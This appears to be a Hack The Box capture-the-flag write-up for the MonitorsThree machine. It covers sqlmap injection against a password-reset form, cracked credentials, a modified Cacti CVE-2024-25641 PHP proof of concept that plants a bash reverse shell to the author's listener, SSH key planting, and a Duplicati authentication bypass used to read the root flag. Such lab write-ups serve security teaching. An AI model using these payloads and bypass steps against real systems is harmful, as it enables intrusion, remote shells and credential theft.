---
title: HTB - MonitorsThree
date: 2025-01-19 00:00:00 + 1000
categories: [Linux,Web App,CTF,HTB]
tags: [SQL Injection, WebExploitation, RCE, Duplicati, AuthenticationBypass]
comments: false
---

The MonitorsThree box was compromised by initially exploiting a SQL injection vulnerability in the web application's password reset functionality. This led to the discovery of credentials for a vulnerable Cacti installation which then enabled RCE. Further exploitation involved gaining access to a Duplicati backup service by bypassing authentication, and grep the root flag through a backup and restore

## Common Enumeration 

### Namp

I fired up the command: `nmap -p- -sC -sV -oA recon/allport 10.10.11.30 --open`. This scans all ports, uses default scripts, checks versions, outputs to a file, and only shows open ones and two ports were open: 

- SSH (port 22)
- HTTP (port 80)

```bash
$ nmap -p- -sC -sV -oA recon/allport 10.10.11.30 --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 20:07 AEDT
Nmap scan report for 10.10.11.30
Host is up (0.011s latency).
Not shown: 65532 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
```

The HTTP was redirecting to `http://monitorsthree.htb/`, I add that to my `/etc/hosts` file
### Directory Brute Forcing and Fuzzing

I used `gobuster` - with a common wordlist to check for hidden directories, it found the `admin`. But when I tried to visit `/admin`, I got a `403` Forbidden

```bash
$ gobuster dir -u http://monitorsthree.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o recon/go.log
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://monitorsthree.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://monitorsthree.htb/images/]
/admin                (Status: 301) [Size: 178] [--> http://monitorsthree.htb/admin/]
/js                   (Status: 301) [Size: 178] [--> http://monitorsthree.htb/js/]
/css                  (Status: 301) [Size: 178] [--> http://monitorsthree.htb/css/]
/.                    (Status: 200) [Size: 13560]
/fonts                (Status: 301) [Size: 178] [--> http://monitorsthree.htb/fonts/]
Progress: 43007 / 43008 (100.00%)
===============================================================
Finished
===============================================================
```

So I pivoted to `ffuf` to see if I could find any virtual hosts running

```bash
$ ffuf -u http://10.10.11.30 -H "Host: FUZZ.monitorsthree.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.30
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.monitorsthree.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 9ms]
#www                    [Status: 400, Size: 166, Words: 6, Lines: 8, Duration: 10ms]
#mail                   [Status: 400, Size: 166, Words: 6, Lines: 8, Duration: 9ms]
:: Progress: [12084/19966] :: Job [1/1] :: 1010 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

It found `cacti` as a virtual host So, I added `cacti.monitorsthree.htb` to my `/etc/hosts` file

```bash
10.10.11.30   monitorsthree.htb cacti.monitorsthree.htb
```

### Browsing the Website

Let's see what this website looks like. Navigating to `http://monitorsthree.htb/` - shows a home page for some networking solutions

![img](/assets/img/MonitorsThree/1.webp)

Nothing too exciting on the surface but clicking the "login" button and it took me to the login screen. As expected, none of the default credentials worked

![img](/assets/img/MonitorsThree/2.webp)

Ah, but there's a "Forget password?" link. Clicked on that it led to the "Password recovery" page; when I entered the incorrect username it threw an error with "Unable to process request, try again!"

![img](/assets/img/MonitorsThree/3.webp)

But when I tried with the correct one it showed "Successfully sent password reset request!" we've got a potential user enumeration vulnerability

![img](/assets/img/MonitorsThree/4.webp)

This feels like the start of a SQL injection adventure...

![img](/assets/img/MonitorsThree/5.webp)

### SQL Injection

I grabbed the request from the "forget password" and saved it to `log.req`

```bash
POST /forgot_password.php HTTP/1.1
Host: monitorsthree.htb
Content-Length: 14
Cache-Control: max-age=0
Origin: http://monitorsthree.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://monitorsthree.htb/forgot_password.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=cp27qurjooo8h1k1v7j0e7h6d7

username=
```

This takes the request file, tells sqlmap that it's a MySQL database, runs it in batch mode, and dumps the data. And what do we get? The database `monitorsthree_db` and a table called `users`, and other 5 tables

```bash
$ sqlmap -r log.req --dbms=mysql --batch --dump

fetching tables for database: 'monitorsthree_db'
fetching number of tables for database 'monitorsthree_db'
retrieved: 6
retrieved: invoices
retrieved: customers
retrieved: changelog
retrieved: tasks
retrieved: invoice_tasks
retrieved: users
```

Next step, find the columns within the `users` table

```bash
sqlmap -r log.req -D monitorsthree_db -T users --dbms=mysql --batch --dump

retrieved: id
retrieved: username
retrieved: email
retrieved: password
retrieved: name
...snip...
```

And then I extracted the juicy bits - the usernames and passwords from that table

```bash
sqlmap -r log.req -D monitorsthree_db -T users -C username,password --level=3 --risk=3 --threads=5 --dump --batch

Database: monitorsthree_db
Table: users
[4 entries]
+-----------+----------------------------------+
| username  | password                         |
+-----------+----------------------------------+
| janderson | 1e68b6eb86b45f6d92f8f292428f77ac |
| admin     | 31a181c8372e3afc59dab863430610e8 |
| dthompson | 633b683cc128fe244b00f176c8a950f5 |
| mwatson   | c585d01f2eb3e6e1073e92023088a3dd |
+-----------+----------------------------------+
```

I took those hashes and threw them into crackstation and the only password that was cracked was for the `admin`: `greencacti2001`

| username  | password       |
| --------- | -------------- |
| janderson | Not found.     |
| admin     | greencacti2001 |
| dthompson | Not found.<br> |
| mwatson   | Not found.<br> |

### Cacti vHost

The subdomain `cacti` we found earlier, now it's time to check it out. Browsing to `http://cacti.monitorsthree.htb/` showed a login page for the `cacti` monitoring tool. And it was running version `1.2.26`

>"Cacti is designed to be a complete graphing solution based on the RRDtool's framework. Its goal is to make a network administrator's job easier by taking care of all the necessary details necessary to create meaningful graphs. [Find more info about the Cacti](https://github.com/Cacti/documentation/blob/develop/README.md)"

![img](/assets/img/MonitorsThree/6.webp)

I tried logging in with the `admin:greencacti2001` credentials and... I am in

![img](/assets/img/MonitorsThree/7.webp)

I googled the cacti version, and found that there was a known vulnerability [Github CVE-2024-25641](https://nvd.nist.gov/vuln/detail/CVE-2024-25641) - "arbitrary file write vulnerability in the `Package Import` allowing authenticated users to execute arbitrary PHP code", which meant we could get RCE

I grabbed the PoC from the [GitHub](https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88), and modified the `$filedata` variable to include a reverse shell.

```php
<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = "<?php shell_exec('/bin/bash -i >& /dev/tcp/10.10.14.44/1337 0>&1'); ?>";
$keypair = openssl_pkey_new(); 
$public_key = openssl_pkey_get_details($keypair)["key"]; 
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>
```

As per the instructions in the PoC, I compressed the payload and then uploaded the template using the "Import Template" functionality on Cacti

![img](/assets/img/MonitorsThree/8.webp)

I also set up a listener on my machine, and visited the `http://cacti.monitorsthree.htb/cacti/resource/test.php`

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.44] from (UNKNOWN) [10.10.11.30] 54782
bash: cannot set terminal process group (1217): Inappropriate ioctl for device
bash: no job control in this shell
www-data@monitorsthree:~/html/cacti/resource$ whoami
whoami
www-data
www-data@monitorsthree:~/html/cacti/resource$
```

## Initial Access

### Shell as www-data

Finally, a shell! It was a basic one though, not interactive. So, I used the good ol' Python trick to upgrade it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

I started snooping around and found `config.php` under `/include`, which contained the database credentials

```bash
$rdatabase_type     = 'mysql';
$rdatabase_default  = 'cacti';
$rdatabase_hostname = 'localhost';
$rdatabase_username = 'cactiuser';
$rdatabase_password = 'cactiuser';
$rdatabase_port     = '3306';
$rdatabase_retries  = 5;
```

#### Logging to mysql 

I then logged in to mysql `mysql -u cactiuser -p`, and found the database `cacti`

```bash
www-data@monitorsthree:~/html/cacti/include$ mysql -u cactiuser -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 21930
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
| mysql              |
+--------------------+
3 rows in set (0.000 sec)

MariaDB [(none)]>
```

Looking through the tables and `user_auth` table was the most interesting

```bash
MariaDB [(none)]> USE cacti;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [cacti]> SHOW TABLES;
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
| aggregate_graph_templates           |
| aggregate_graph_templates_graph     |
| aggregate_graph_templates_item      |
...snip...
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
+-------------------------------------+
113 rows in set (0.001 sec)

```

There were three users `admin`, `guest` and `marcus`, along with their password hashes

```bash
MariaDB [cacti]> SELECT * FROM user_auth \G;
*************************** 1. row ***************************
                    id: 1
              username: admin
              password: $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G
                 realm: 0
             full_name: Administrator
         email_address: marcus@monitorsthree.htb
  must_change_password:
       password_change:
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: on
            login_opts: 2
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: on
            lastchange: -1
             lastlogin: -1
      password_history: -1
                locked:
       failed_attempts: 0
              lastfail: 0
           reset_perms: 436423766
*************************** 2. row ***************************
                    id: 3
              username: guest
              password: $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu
                 realm: 0
             full_name: Guest Account
         email_address: guest@monitorsthree.htb
  must_change_password:
       password_change:
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings:
            login_opts: 1
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled:
            lastchange: -1
             lastlogin: -1
      password_history: -1
                locked:
       failed_attempts: 0
              lastfail: 0
           reset_perms: 3774379591
*************************** 3. row ***************************
                    id: 4
              username: marcus
              password: $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK
                 realm: 0
             full_name: Marcus
         email_address: marcus@monitorsthree.htb
  must_change_password:
       password_change: on
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: on
            login_opts: 1
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: on
            lastchange: -1
             lastlogin: -1
      password_history:
                locked:
       failed_attempts: 0
              lastfail: 0
           reset_perms: 1677427318
3 rows in set (0.000 sec)

ERROR: No query specified
```

I took that password hash and cracked it and the password was `marcus:12345678910`

```bash
$ hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt

$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIa...9IBjtK
Time.Started.....: Sat Jan 18 16:21:06 2025 (9 secs)
Time.Estimated...: Sat Jan 18 16:21:15 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       51 H/s (9.69ms) @ Accel:2 Loops:128 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 436/14344385 (0.00%)
Rejected.........: 0/436 (0.00%)
Restore.Point....: 432/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:896-1024
Candidate.Engine.: Device Generator
Candidates.#1....: 12345678910 -> liliana
Hardware.Mon.#1..: Util: 98%

Started: Sat Jan 18 16:20:52 2025
Stopped: Sat Jan 18 16:21:16 2025
```

I tried sshing using this password, but it did not work as it seems like `publickey` was the only method to authenticate

```bash
$ ssh marcus@10.10.11.30
The authenticity of host '10.10.11.30 (10.10.11.30)' cant be established.
ED25519 key fingerprint is SHA256:1llzaKeglum8R0dawipiv9mSGU33yzoUW3frO9MAF6U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.30' (ED25519) to the list of known hosts.
marcus@10.10.11.30: Permission denied (publickey).
```

### SSH as Marcus

So, I `su` to `marcus` and added my own ssh key

```bash
ssh-keygen -t rsa -b 4096 -f ./id_rsa

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDJb9At/KEbSaCgQ9oxphqXcjIumyG+8Y/cj17YT82FkTG6dW1dz3K4orpV3ujwCzbzX8pm7GRBqyMUaMT5jXuuRgApTkimlomtSMo9u0p0IJA535w60//Ijb6zdoqxc8TAAMeyOd0kPrpAQD7jUM2ZCKWDXfOAnZp3JEF6n9eLYrGcxUu5JG18m/gdLjrSTr4f3VAWpxnw4GNSffmE7vYlNur9Awqx4Ukrcva4M788147Q1g2a8GyCU8etasHClSS81BMPwJHFHvBghIYiQLZ5F/0uS+Pn9fDJwP7vXOGHEhRwuKH2nHk6lDVOkwZbLdQxP2u9R7QLjfKJYYrtHcvynRdtqNHh7ACiPmIwPUIINLzxO1M+bIpyYjjDcAN0i/P7odzMO5dtUAPvleEWQhGvCRr63u767H+ysrjvu3QbuseFZ5vaDyMFwWT7DuZ2ap/cE4yqFjKF7LLFhaIe8jX9cxR8HTMpgda2TYthNc9GsDh9zvqiT0bzmVhjGNpEj5O1s5fnOy8RdbeL8VThxdTGGIjr+k/3FCt5LjhvdbsqLsgO2TLsant6G/A8aF9AqTRvqo8ysDYKbMvk4TP7mGJ/F6yrdKTvNFYgNB7vfXBf2CdOCGQ65QMS+rc84Mk3l4NUK1voF+G5fEbdbv2S87CPecaQ4ZZvCqqojq/Qn32HYw==" >> authorized_keys 
```

And then, I sshed as marcus using the newly generated key `$ ssh marcus@10.10.11.30 -i id_rsa` and got the user flag

```text
0c562ce03...
```

## Privilege Escalation

I ran `netstat -tnlp` to see what other services were listening, and found that `Duplicati` was running on `127.0.0.1:8200`

```bash
marcus@monitorsthree:~$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:45931         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

I tried to curl the port to see what was on it, and it was redirecting. I used the `-L` option to follow redirect

```bash
$ curl http://127.0.0.1:8200 -v -L
```

### Port forwarding - (8200)

To access Duplicati, I set up port forwarding using SSH. This command forwards my local port `8200` to the remote host’s localhost:`8200`

```bash
ssh -fN -L 8200:127.0.0.1:8200 marcus@10.10.11.30 -i id_rsa
```

With the port forward in place, I browsed `http://127.0.0.1:8200` on my machine and saw the Duplicati login page. I have tried the password from earlier but none worked

![img](/assets/img/MonitorsThree/9.webp)

I did a quick google search, and found an [Authentication Bypass](https://github.com/duplicati/duplicati/issues/5197) and followed the steps on how to exploit it. But we need to grab a SQLite DB file, we need to pull `server-passphrase` of it

I found the sqlite db file under `/opt/duplicati/config`

```bash
marcus@monitorsthree:/opt/duplicati/config$ ls -l
total 2496
-rw-r--r-- 1 root root 2461696 Jan 17 23:31 CTADPNHLTC.sqlite
-rw-r--r-- 1 root root   90112 Jan 18 00:31 Duplicati-server.sqlite
drwxr-xr-x 2 root root    4096 Aug 18 08:00 control_dir_v2
```

I then copied the sqlite db to my machine

```bash
$ scp -i id_rsa marcus@10.10.11.30:/opt/duplicati/config/Duplicati-server.sqlite .
Duplicati-server.sqlite                                                                                100%   88KB   1.9MB/s   00:00
```

I used `sqlite` to view the tables

```bash
sqlite> .tables
Backup        Log           Option        TempFile
ErrorLog      Metadata      Schedule      UIStorage
Filter        Notification  Source        Version
sqlite>
```

The `server-passphrase` is in the `Option` table

```bash
sqlite> SELECT * from Option;
4||encryption-module|
4||compression-module|zip
4||dblock-size|50mb
4||--no-encryption|true
-1||--asynchronous-upload-limit|50
-1||--asynchronous-concurrent-upload-limit|50
-2||startup-delay|0s
-2||max-download-speed|
-2||max-upload-speed|
-2||thread-priority|
-2||last-webserver-port|8200
-2||is-first-run|
-2||server-port-changed|True
-2||server-passphrase|Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
-2||server-passphrase-salt|xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=
-2||server-passphrase-trayicon|e2612e45-3893-4fc8-9be7-b80980245aa7
-2||server-passphrase-trayicon-hash|ohPrNL9l14jvzkrBagiAWniLQ8/x9DRvEQz07KyweuY=
-2||last-update-check|638727535253612840
-2||update-check-interval|
-2||update-check-latest|
-2||unacked-error|False
-2||unacked-warning|False
-2||server-listen-interface|any
-2||server-ssl-certificate|
-2||has-fixed-invalid-backup-id|True
-2||update-channel|
-2||usage-reporter-level|
-2||has-asked-for-password-protection|true
-2||disable-tray-icon-login|false
-2||allowed-hostnames|*
sqlite>
```

As the Github mentioned, I have converted the `server-passphrase` from base64 to hex

```bash
$ echo "Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=" | base64 -d | xxd -p
59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
```

And then I grepped for the `Nonce`

![img](/assets/img/MonitorsThree/10.webp)

Next, I prepared the command using javascript as below:

```js
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
<script>
  var saltedpwd = '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a';
  var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse
  ('4wCxOFLE2PZY7lL7j3VcvXuAaZl6tWqHwIBwjuD82uM=') + saltedpwd)).toString(CryptoJS.enc.Base64);
  console.log(noncedpwd);
</script>
```

And used an online [javascript compiler](https://playcode.io/javascript), which printed out the hash `7y/DWLZ7volQsN2MRxMEG3w1EDKQ/Rk8s+onQ+gds00=` and and I URL encoded it

![img](/assets/img/MonitorsThree/12.webp)

I used that generated hash to log in to Duplicati

![img](/assets/img/MonitorsThree/13.webp)

## Root

Now, finally let's grab the root flag!

First, I added a backup and named it `z3r0da`, and disabled encryption

![img](/assets/img/MonitorsThree/14.webp)

Next, I selected the folder path as `/source/mnt/`

![img](/assets/img/MonitorsThree/15.webp)

After that I added the source folders as `/source/root/root.txt` and disabled the automatic backups on step 4 (Schedule)

![img](/assets/img/MonitorsThree/16.webp)

On step 5 (Options), I left everything as default and clicked save and then clicked "Run Now"

![img](/assets/img/MonitorsThree/17.webp)

Then, I navigated to "Restore" and selected the `z3r0da` backup and clicked next

![img](/assets/img/MonitorsThree/18.webp)

I selected the folder path as below

![img](/assets/img/MonitorsThree/19.webp)

And finally, the root flag was in `z3r0da.txt`

```bash
marcus@monitorsthree:~$ cd z3r0da.txt/
marcus@monitorsthree:~/z3r0da.txt$ ls
root.txt
marcus@monitorsthree:~/z3r0da.txt$ cat root.txt
eb6d59e28...
```

